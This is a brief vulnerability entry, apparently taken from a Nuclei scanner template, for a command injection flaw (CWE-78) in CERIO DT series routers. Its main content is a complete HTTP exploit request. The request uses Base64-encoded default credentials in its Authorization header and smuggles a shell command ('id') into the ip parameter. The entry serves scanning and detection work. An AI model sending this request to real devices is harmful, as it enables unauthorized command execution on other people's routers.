# Vulnerability: CERIO-DT Interface - Command Execution
**Classification:** CWE-78
**Source:** Nuclei Template (`cerio-dt-rce.yaml`)

## Description
CERIO DT series routers have an operation command injection vulnerability in specific versions. An attacker could exploit this vulnerability to execute commands.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /cgi-bin/Save.cgi?cgi=PING HTTP/1.1
Host: {{Hostname}}
Authorization: Basic b3BlcmF0b3I6MTIzNA==
Content-Type: application/x-www-form-urlencoded

pid=2061&ip=127.0.0.1;id&times=1
```

